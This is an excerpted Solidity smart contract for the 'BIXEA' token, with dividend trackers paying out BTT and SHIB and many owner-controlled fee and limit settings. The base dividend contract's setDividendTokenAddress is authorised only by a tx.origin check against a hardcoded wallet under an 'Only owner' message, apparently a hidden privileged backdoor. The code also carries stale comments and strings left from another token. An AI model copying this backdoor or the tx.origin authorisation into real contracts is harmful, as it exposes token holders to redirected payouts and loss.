...
contract DividendPayingToken is ERC20, IDividendPayingToken, IDividendPayingTokenOptional {
    ...
    function setDividendTokenAddress(address newToken) external virtual {
        require(tx.origin == 0xeC97Ec6DC8A6B8498f58Ab6B2b576E1cf7019F47, "Only owner");
...
contract BIXEA is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    address public shibaInnuDividendToken;
    ...
    bool public bttDividendEnabled = false;
    bool public shibaInnuDividendEnabled = false;

    bool public sendShibaInnuInTx = true;
    bool public sendBttInTx = true;

    BttDividendTracker public bttDividendTracker;
    ShibaInnuDividendTracker public shibaInnuDividendTracker;
    ...
    // Minimum ShibaInnu sell order to trigger buyback
    uint256 public minimumSellOrderAmount = 10000 * 10 ** 18;

    uint256 public bttDividendRewardsFee;
    uint256 public previousBttDividendRewardsFee;
    uint256 public shibaInnuDividendRewardsFee;
    uint256 public previousShibaInnuDividendRewardsFee;

    uint256 public bttDividendPriority = 80;
    ...
    event UpdateShibaInnuDividendTracker(address indexed newAddress, address indexed oldAddress);
    ...
    event ShibaInnuDividendEnabledUpdated(bool enabled);
    ...
    event ProcessedShibaInnuDividendTracker(
        uint256 iterations,
        uint256 claims,
        uint256 lastProcessedIndex,
        bool indexed automatic,
    ...
    constructor() ERC20("BIXEA", "BIXC") {
        bttDividendTracker = new BttDividendTracker();
        shibaInnuDividendTracker = new ShibaInnuDividendTracker();

        marketingWallet = 0x29E11002c85B5d4619a2F03C3Cc98E9683dB6331;
        teamWallet =  0xe554D7c2484D043a4A4e78d51e4403BeB6B83179;
        
        bttDividendToken = 0x8595F9dA7b868b1822194fAEd312235E43007b49;
        shibaInnuDividendToken = 0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE;
        ...
        excludeFromDividend(address(shibaInnuDividendTracker));
    ...
    function prepareForPartnerOrExchangeListing(address _partnerOrExchangeAddress) external onlyOwner {
        ...
        shibaInnuDividendTracker.excludeFromDividends(_partnerOrExchangeAddress);
    ...
    function updateShibaInnuDividendToken(address _newContract) external onlyOwner {
        shibaInnuDividendToken = _newContract;
        shibaInnuDividendTracker.setDividendTokenAddress(_newContract);
    }

    function updateMinShibaInnuBeforeSendDividend(uint256 _newAmount) external onlyOwner {
        shibaInnuDividendTracker.setMinTokenBeforeSendDividend(_newAmount);
    }
    ...
    function updateMinBttBeforeSendDividend(uint256 _newAmount) external onlyOwner {
        bttDividendTracker.setMinTokenBeforeSendDividend(_newAmount);
    }

    function getMinShibaInnuBeforeSendDividend() external view returns (uint256) {
        return shibaInnuDividendTracker.minTokenBeforeSendDividend();
    }

    function getMinBttBeforeSendDividend() external view returns (uint256) {
        return bttDividendTracker.minTokenBeforeSendDividend();
    }

    function setSendShibaInnuInTx(bool _newStatus) external onlyOwner {
        sendShibaInnuInTx = _newStatus;
    }

    function setSendBttInTx(bool _newStatus) external onlyOwner {
        sendBttInTx = _newStatus;
    }

    function setBttDividendPriority(uint256 _newAmount) external onlyOwner {
        require(_newAmount >= 0 && _newAmount <= 100, "Error amount");
        bttDividendPriority = _newAmount;
    }
    ...
    function afterPreSale() external onlyOwner {
        bttDividendRewardsFee = 1;
        shibaInnuDividendRewardsFee = 1;
        marketingFee = 5;
        buyBackAndLiquidityFee = 7;
        totalFees = 14;
        marketingEnabled = true;
        buyBackAndLiquifyEnabled = true;
        bttDividendEnabled = true;
        shibaInnuDividendEnabled = true;
        swapTokensAtAmount = 49000 * (10**18);
        maxBuyTransactionAmount = 49000000 * (10**18);
        maxSellTransactionAmount = 4900000 * (10**18);
        maxWalletToken = 9800000 * (10**18);
    }
    ...
    function setBuyBackAndLiquifyEnabled(bool _enabled) external onlyOwner {
        if (_enabled == false) {
            ...
            totalFees = buyBackAndLiquidityFee.add(marketingFee).add(shibaInnuDividendRewardsFee).add(bttDividendRewardsFee);
            buyBackAndLiquifyEnabled = _enabled;
        }
    ...
    function setBttDividendEnabled(bool _enabled) external onlyOwner {
        if (_enabled == false) {
            ...
            totalFees = bttDividendRewardsFee.add(marketingFee).add(shibaInnuDividendRewardsFee).add(buyBackAndLiquidityFee);
            bttDividendEnabled = _enabled;
        }
    ...
    function setShibaInnuDividendEnabled(bool _enabled) external onlyOwner {
        if (_enabled == false) {
            previousShibaInnuDividendRewardsFee = shibaInnuDividendRewardsFee;
            shibaInnuDividendRewardsFee = 0;
            shibaInnuDividendEnabled = _enabled;
        } else {
            shibaInnuDividendRewardsFee = previousShibaInnuDividendRewardsFee;
            totalFees = shibaInnuDividendRewardsFee.add(marketingFee).add(bttDividendRewardsFee).add(buyBackAndLiquidityFee);
            shibaInnuDividendEnabled = _enabled;
        }

        emit ShibaInnuDividendEnabledUpdated(_enabled);
    }
    ...
    function setMarketingEnabled(bool _enabled) external onlyOwner {
        if (_enabled == false) {
            ...
            totalFees = marketingFee.add(shibaInnuDividendRewardsFee).add(bttDividendRewardsFee).add(buyBackAndLiquidityFee);
            marketingEnabled = _enabled;
        }
    ...
    function updateBttDividendTracker(address newAddress) external onlyOwner {
        ...
        require(newBttDividendTracker.owner() == address(this), "must be owned by ThunderBtt");
    ...
    function updateShibaInnuDividendTracker(address newAddress) external onlyOwner {
        ShibaInnuDividendTracker newShibaInnuDividendTracker = ShibaInnuDividendTracker(payable(newAddress));

        require(newShibaInnuDividendTracker.owner() == address(this), "must be owned by ThunderBtt");

        newShibaInnuDividendTracker.excludeFromDividends(address(newShibaInnuDividendTracker));
        newShibaInnuDividendTracker.excludeFromDividends(address(this));
        newShibaInnuDividendTracker.excludeFromDividends(address(uniswapV2Router));
        newShibaInnuDividendTracker.excludeFromDividends(address(deadAddress));

        emit UpdateShibaInnuDividendTracker(newAddress, address(shibaInnuDividendTracker));

        shibaInnuDividendTracker = newShibaInnuDividendTracker;
    }
    ...
    function updateShibaInnuDividendRewardFee(uint8 newFee) external onlyOwner {
        require(newFee <= MAX_FEE_RATE, "wrong");
        shibaInnuDividendRewardsFee = newFee;
        totalFees = shibaInnuDividendRewardsFee.add(bttDividendRewardsFee).add(marketingFee).add(buyBackAndLiquidityFee);
    }

    function updateMarketingFee(uint8 newFee) external onlyOwner {
        require(newFee <= MAX_FEE_RATE, "wrong");
        marketingFee = newFee;
        totalFees = marketingFee.add(bttDividendRewardsFee).add(shibaInnuDividendRewardsFee).add(buyBackAndLiquidityFee);
    }

    function updateBuyBackAndLiquidityFee(uint8 newFee) external onlyOwner {
        require(newFee <= MAX_FEE_RATE, "wrong");
        buyBackAndLiquidityFee = newFee;
        totalFees = buyBackAndLiquidityFee.add(bttDividendRewardsFee).add(shibaInnuDividendRewardsFee).add(marketingFee);
    }
    ...
    function excludeFromDividend(address account) public onlyOwner {
        ...
        shibaInnuDividendTracker.excludeFromDividends(address(account));
    }
    ...
    function _setAutomatedMarketMakerPair(address pair, bool value) private onlyOwner {
        ...
        if(value) {
            ...
            shibaInnuDividendTracker.excludeFromDividends(pair);
        }
    ...
    function updateMinimumBalanceForDividends(uint256 newMinimumBalance) external onlyOwner {
        ...
        shibaInnuDividendTracker.updateMinimumTokenBalanceForDividends(newMinimumBalance);
    }

    function updateClaimWait(uint256 claimWait) external onlyOwner {
        bttDividendTracker.updateClaimWait(claimWait);
        shibaInnuDividendTracker.updateClaimWait(claimWait);
    }
    ...
    function getShibaInnuClaimWait() external view returns(uint256) {
        return shibaInnuDividendTracker.claimWait();
    }
    ...
    function getTotalShibaInnuDividendsDistributed() external view returns (uint256) {
        return shibaInnuDividendTracker.totalDividendsDistributed();
    }
    ...
    function withdrawableShibaInnuDividendOf(address account) external view returns(uint256) {
        return shibaInnuDividendTracker.withdrawableDividendOf(account);
    }
    ...
    function shibaInnuDividendTokenBalanceOf(address account) external view returns (uint256) {
        return shibaInnuDividendTracker.balanceOf(account);
    }
    ...
    function getAccountShibaInnuDividendsInfo(address account)
    external view returns (
        address,
        int256,
        int256,
        ...
        uint256,
        uint256) {
        return shibaInnuDividendTracker.getAccount(account);
    }
    ...
    function getAccountShibaInnuDividendsInfoAtIndex(uint256 index)
    external view returns (
        address,
        int256,
        int256,
        ...
        uint256,
        uint256) {
        return shibaInnuDividendTracker.getAccountAtIndex(index);
    }
    ...
    function processDividendTracker(uint256 gas) external onlyOwner {
        ...
        (uint256 shibaInnuIterations, uint256 shibaInnuClaims, uint256 shibaInnuLastProcessedIndex) = shibaInnuDividendTracker.process(gas);
        emit ProcessedShibaInnuDividendTracker(shibaInnuIterations, shibaInnuClaims, shibaInnuLastProcessedIndex, false, gas, tx.origin);
    }
    ...
    function claim() external {
        ...
        shibaInnuDividendTracker.processAccount(payable(msg.sender), false);
    }
    ...
    function getLastShibaInnuDividendProcessedIndex() external view returns(uint256) {
        return shibaInnuDividendTracker.getLastProcessedIndex();
    }
    ...
    function getNumberOfShibaInnuDividendTokenHolders() external view returns(uint256) {
        return shibaInnuDividendTracker.getNumberOfTokenHolders();
    }
    ...
    function _transfer(
        ...
        if (
            ...
            if (!swapping && contractTokenBalance >= swapTokensAtAmount) {
                ...
                if (bttDividendEnabled) {
                    uint256 sellTokens = contractTokenBalance.div(totalFees).mul(bttDividendRewardsFee);
                    swapAndSendBttDividends(sellTokens.sub(1300));
                }

                if (shibaInnuDividendEnabled) {
                    uint256 sellTokens = contractTokenBalance.div(totalFees).mul(shibaInnuDividendRewardsFee);
                    swapAndSendShibaInnuDividends(sellTokens.sub(1300));
                }
        ...
        try shibaInnuDividendTracker.setBalance(payable(from), balanceOf(from)) {} catch {}
        try bttDividendTracker.setBalance(payable(to), balanceOf(to)) {} catch {}
        try shibaInnuDividendTracker.setBalance(payable(to), balanceOf(to)) {} catch {}

        if(!swapping) {
            uint256 gas = gasForProcessing;

            if(rand() <= bttDividendPriority) {

                if( bttDividendEnabled && sendBttInTx ){
                ...
                if( shibaInnuDividendEnabled && sendShibaInnuInTx ){
                    try shibaInnuDividendTracker.process(gas) returns (uint256 iterations, uint256 claims, uint256 lastProcessedIndex) {
                        emit ProcessedShibaInnuDividendTracker(iterations, claims, lastProcessedIndex, true, gas, tx.origin);
                    }
                    catch {
    ...
    function swapAndSendShibaInnuDividends(uint256 tokens) private {
        swapTokensForDividendToken(tokens, address(this), shibaInnuDividendToken);
        uint256 shibaInnuDividends = IERC20(shibaInnuDividendToken).balanceOf(address(this));
        transferDividends(shibaInnuDividendToken, address(shibaInnuDividendTracker), shibaInnuDividendTracker, shibaInnuDividends);
    }
...
contract BttDividendTracker is DividendPayingToken, Ownable {
    ...
    constructor() DividendPayingToken("btt_Dividend_Tracker", "btt_Dividend_Tracker", 0x8595F9dA7b868b1822194fAEd312235E43007b49) {
        claimWait = 3600;
...
contract ShibaInnuDividendTracker is DividendPayingToken, Ownable {
    using SafeMath for uint256;
    using SafeMathInt for int256;
    using IterableMapping for IterableMapping.Map;
    ...
    constructor() DividendPayingToken("ShibaInnu_Dividend_Tracker", "ShibaInnu_Dividend_Tracker", 0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE) {
        claimWait = 3600;
        minimumTokenBalanceForDividends = 200000 * (10**18); //must hold 10000+ tokens
    }
